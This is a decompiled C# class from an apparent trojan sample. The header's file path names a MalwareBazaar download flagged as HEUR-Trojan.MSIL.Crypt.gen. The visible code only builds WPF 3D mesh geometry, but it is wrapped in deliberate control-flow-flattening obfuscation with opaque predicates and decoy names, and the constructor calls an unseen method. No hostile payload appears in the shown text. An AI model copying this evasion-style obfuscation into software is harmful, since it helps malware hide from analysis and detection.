// Decompiled with JetBrains decompiler
// Type: Tourield.Structs.ErrorParserStructBuilder
// Assembly: DebuggerTypeProxyAttrib, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: 3D9F2D5D-94C2-4B9B-BC0A-C78BF30C6035
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-5acf494024d29f4957958fce64819adc19bc7cffa6d323531e5a321496a04ae0.exe

using DebuggerTypeProxyAttrib.Pages;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Media3D;

namespace Tourield.Structs
{
  internal class ErrorParserStructBuilder
  {
    [MethodImpl(MethodImplOptions.NoInlining)]
    public static GeometryModel3D WriteOrder(Point3D reference, Brush counter)
    {
      int num1 = 11;
      GeometryModel3D geometryModel3D1;
      while (true)
      {
        int num2 = num1;
        MeshGeometry3D meshGeometry3D;
        GeometryModel3D geometryModel3D2;
        Point3DCollection point3Dcollection;
        TranslateTransform3D translateTransform3D;
        Int32Collection int32Collection;
        PointCollection pointCollection;
        while (true)
        {
          switch (num2)
          {
            case 0:
              point3Dcollection.Add(new Point3D(0.0, 0.0, 0.0));
              num2 = 12;
              continue;
            case 1:
              goto label_1;
            case 2:
            case 7:
              pointCollection.Add(new Point(0.0, 1.0));
              pointCollection.Add(new Point(0.0, 0.0));
              meshGeometry3D.TextureCoordinates = pointCollection;
              if (true)
              {
                num2 = 9;
                continue;
              }
              goto case 6;
            case 3:
              goto label_14;
            case 4:
              goto label_2;
            case 5:
              int32Collection.Add(3);
              int32Collection.Add(4);
              int32Collection.Add(5);
              num2 = 10;
              continue;
            case 6:
            case 8:
              meshGeometry3D.Positions = point3Dcollection;
              pointCollection = new PointCollection();
              pointCollection.Add(new Point(0.0, 0.0));
              pointCollection.Add(new Point(1.0, 0.0));
              pointCollection.Add(new Point(1.0, 1.0));
              pointCollection.Add(new Point(1.0, 1.0));
              goto case 2;
            case 9:
              int32Collection = new Int32Collection();
              int32Collection.Add(0);
              int32Collection.Add(1);
              int32Collection.Add(2);
              int num3 = 5;
              num2 = ErrorParserStructBuilder.PatchAttribute() ? num3 : num3;
              continue;
            case 10:
              meshGeometry3D.TriangleIndices = int32Collection;
              DiffuseMaterial diffuseMaterial = new DiffuseMaterial(counter);
              geometryModel3D2.Material = (Material) diffuseMaterial;
              geometryModel3D2.Geometry = (Geometry3D) meshGeometry3D;
              translateTransform3D = new TranslateTransform3D();
              translateTransform3D.OffsetX = reference.X;
              translateTransform3D.OffsetY = reference.Y;
              if (true)
              {
                num2 = 14;
                continue;
              }
              goto label_17;
            case 11:
              goto label_5;
            case 12:
              point3Dcollection.Add(new Point3D(1.0, 0.0, 0.0));
              num2 = 13;
              continue;
            case 13:
              goto label_13;
            case 14:
              goto label_15;
            case 15:
              goto label_17;
            default:
              goto label_11;
          }
        }
label_1:
        meshGeometry3D = new MeshGeometry3D();
        geometryModel3D2 = new GeometryModel3D();
        meshGeometry3D.Normals = new Vector3DCollection()
        {
          new Vector3D(0.0, 0.0, 1.0),
          new Vector3D(0.0, 0.0, 1.0),
          new Vector3D(0.0, 0.0, 1.0),
          new Vector3D(0.0, 0.0, 1.0),
          new Vector3D(0.0, 0.0, 1.0),
          new Vector3D(0.0, 0.0, 1.0)
        };
        point3Dcollection = new Point3DCollection();
        num1 = 0;
        continue;
label_2:
        geometryModel3D2.Transform = (Transform3D) translateTransform3D;
        geometryModel3D1 = geometryModel3D2;
        num1 = 15;
        continue;
label_5:
        double x = reference.X;
        num1 = 3;
        continue;
label_11:
        num1 = 2;
        continue;
label_13:
        point3Dcollection.Add(new Point3D(1.0, 1.0, 0.0));
        point3Dcollection.Add(new Point3D(1.0, 1.0, 0.0));
        point3Dcollection.Add(new Point3D(0.0, 1.0, 0.0));
        point3Dcollection.Add(new Point3D(0.0, 0.0, 0.0));
        num1 = 8;
        continue;
label_14:
        double y = reference.Y;
        double z = reference.Z;
        num1 = 1;
        continue;
label_15:
        translateTransform3D.OffsetZ = reference.Z;
        num1 = 4;
      }
label_17:
      return geometryModel3D1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static GeometryModel3D FindOrder(Point3D info, Brush visitor)
    {
      int num1 = 11;
      GeometryModel3D order;
      while (true)
      {
        GeometryModel3D geometryModel3D;
        int num2;
        MeshGeometry3D meshGeometry3D;
        Vector3DCollection vector3Dcollection;
        Point3DCollection point3Dcollection;
        TranslateTransform3D translateTransform3D;
        PointCollection pointCollection;
        switch (num1)
        {
          case 0:
          case 11:
            double x = info.X;
            if (ErrorParserStructBuilder.OrderAttribute())
            {
              num1 = 14;
              continue;
            }
            goto label_18;
          case 1:
            translateTransform3D = new TranslateTransform3D();
            translateTransform3D.OffsetX = info.X;
            num2 = 4;
            break;
          case 2:
          case 13:
            geometryModel3D = new GeometryModel3D();
            vector3Dcollection = new Vector3DCollection();
            num2 = 3;
            break;
          case 3:
            vector3Dcollection.Add(new Vector3D(0.0, 0.0, 1.0));
            vector3Dcollection.Add(new Vector3D(0.0, 0.0, 1.0));
            num2 = 10;
            break;
          case 4:
            translateTransform3D.OffsetY = info.Y;
            translateTransform3D.OffsetZ = info.Z;
            geometryModel3D.Transform = (Transform3D) translateTransform3D;
            num2 = 6;
            break;
          case 5:
            meshGeometry3D.Positions = point3Dcollection;
            pointCollection = new PointCollection();
            pointCollection.Add(new Point(0.0, 0.0));
            pointCollection.Add(new Point(1.0, 0.0));
            pointCollection.Add(new Point(1.0, 1.0));
            pointCollection.Add(new Point(1.0, 1.0));
            if (true)
            {
              num1 = 8;
              continue;
            }
            goto case 14;
          case 6:
            order = geometryModel3D;
            num2 = 15;
            break;
          case 7:
            point3Dcollection = new Point3DCollection();
            point3Dcollection.Add(new Point3D(0.0, 0.0, 0.0));
            point3Dcollection.Add(new Point3D(1.0, 0.0, 0.0));
            point3Dcollection.Add(new Point3D(1.0, 1.0, 0.0));
            point3Dcollection.Add(new Point3D(1.0, 1.0, 0.0));
            goto case 12;
          case 8:
            pointCollection.Add(new Point(0.0, 1.0));
            pointCollection.Add(new Point(0.0, 0.0));
            meshGeometry3D.TextureCoordinates = pointCollection;
            meshGeometry3D.TriangleIndices = new Int32Collection()
            {
              0,
              1,
              2,
              3,
              4,
              5
            };
            DiffuseMaterial diffuseMaterial = new DiffuseMaterial(visitor);
            geometryModel3D.Material = (Material) diffuseMaterial;
            geometryModel3D.Geometry = (Geometry3D) meshGeometry3D;
            num2 = 1;
            break;
          case 9:
            meshGeometry3D.Normals = vector3Dcollection;
            num2 = 7;
            break;
          case 10:
            vector3Dcollection.Add(new Vector3D(0.0, 0.0, 1.0));
            vector3Dcollection.Add(new Vector3D(0.0, 0.0, 1.0));
            vector3Dcollection.Add(new Vector3D(0.0, 0.0, 1.0));
            vector3Dcollection.Add(new Vector3D(0.0, 0.0, 1.0));
            if (true)
            {
              num1 = 9;
              continue;
            }
            goto case 3;
          case 12:
            point3Dcollection.Add(new Point3D(0.0, 1.0, 0.0));
            point3Dcollection.Add(new Point3D(0.0, 0.0, 0.0));
            num2 = 5;
            break;
          case 14:
            double y = info.Y;
            double z = info.Z;
            meshGeometry3D = new MeshGeometry3D();
            num2 = 13;
            break;
          case 15:
            goto label_18;
          default:
            if (true)
            {
              num1 = 12;
              continue;
            }
            goto case 10;
        }
        num1 = num2;
      }
label_18:
      return order;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static GeometryModel3D AwakeOrder(Point3D config, Brush caller)
    {
      int num1 = 4;
      if (true)
        goto label_6;
label_1:
      double z = config.Z;
      MeshGeometry3D meshGeometry3D = new MeshGeometry3D();
      GeometryModel3D geometryModel3D1 = new GeometryModel3D();
      num1 = 3;
label_6:
      GeometryModel3D geometryModel3D2;
      while (true)
      {
        Point3DCollection point3Dcollection;
        int num2;
        TranslateTransform3D translateTransform3D;
        Vector3DCollection vector3Dcollection;
        PointCollection pointCollection;
        Int32Collection int32Collection;
        switch (num1)
        {
          case 0:
            point3Dcollection.Add(new Point3D(0.99, 0.99, 0.0));
            point3Dcollection.Add(new Point3D(0.01, 0.99, 0.0));
            point3Dcollection.Add(new Point3D(0.01, 0.01, 0.0));
            goto case 7;
          case 1:
            meshGeometry3D.TextureCoordinates = pointCollection;
            int32Collection = new Int32Collection();
            int32Collection.Add(0);
            int32Collection.Add(1);
            num2 = 9;
            break;
          case 2:
          case 14:
            goto label_1;
          case 3:
            vector3Dcollection = new Vector3DCollection();
            vector3Dcollection.Add(new Vector3D(0.0, 0.0, 1.0));
            vector3Dcollection.Add(new Vector3D(0.0, 0.0, 1.0));
            vector3Dcollection.Add(new Vector3D(0.0, 0.0, 1.0));
            vector3Dcollection.Add(new Vector3D(0.0, 0.0, 1.0));
            vector3Dcollection.Add(new Vector3D(0.0, 0.0, 1.0));
            num2 = 5;
            break;
          case 4:
            double x = config.X;
            if (true)
            {
              num1 = 6;
              continue;
            }
            goto case 3;
          case 5:
            vector3Dcollection.Add(new Vector3D(0.0, 0.0, 1.0));
            meshGeometry3D.Normals = vector3Dcollection;
            num2 = 11;
            break;
          case 6:
            double y = config.Y;
            int num3 = 14;
            num1 = ErrorParserStructBuilder.PatchAttribute() ? num3 : num3;
            continue;
          case 7:
            meshGeometry3D.Positions = point3Dcollection;
            num2 = 13;
            break;
          case 8:
          case 12:
            translateTransform3D.OffsetX = config.X;
            translateTransform3D.OffsetY = config.Y;
            translateTransform3D.OffsetZ = config.Z;
            geometryModel3D1.Transform = (Transform3D) translateTransform3D;
            geometryModel3D2 = geometryModel3D1;
            num2 = 15;
            break;
          case 9:
            int32Collection.Add(2);
            int32Collection.Add(3);
            int32Collection.Add(4);
            int32Collection.Add(5);
            meshGeometry3D.TriangleIndices = int32Collection;
            DiffuseMaterial diffuseMaterial = new DiffuseMaterial(caller);
            geometryModel3D1.Material = (Material) diffuseMaterial;
            num2 = 10;
            break;
          case 10:
            geometryModel3D1.Geometry = (Geometry3D) meshGeometry3D;
            translateTransform3D = new TranslateTransform3D();
            if (ErrorParserStructBuilder.OrderAttribute())
            {
              num1 = 8;
              continue;
            }
            goto case 0;
          case 11:
            point3Dcollection = new Point3DCollection();
            point3Dcollection.Add(new Point3D(0.01, 0.01, 0.0));
            point3Dcollection.Add(new Point3D(0.99, 0.01, 0.0));
            point3Dcollection.Add(new Point3D(0.99, 0.99, 0.0));
            num2 = 0;
            break;
          case 13:
            pointCollection = new PointCollection();
            pointCollection.Add(new Point(1.0, 1.0));
            pointCollection.Add(new Point(0.0, 1.0));
            pointCollection.Add(new Point(0.0, 0.0));
            pointCollection.Add(new Point(0.0, 0.0));
            pointCollection.Add(new Point(1.0, 0.0));
            pointCollection.Add(new Point(1.0, 1.0));
            num2 = 1;
            break;
          case 15:
            goto label_17;
          default:
            if (true)
            {
              num1 = 7;
              continue;
            }
            goto case 4;
        }
        num1 = num2;
      }
label_17:
      return geometryModel3D2;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public ErrorParserStructBuilder()
    {
      RegistryPagePage.ListMethod();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static bool OrderAttribute() => true;

    internal static bool PatchAttribute() => false;
  }
}
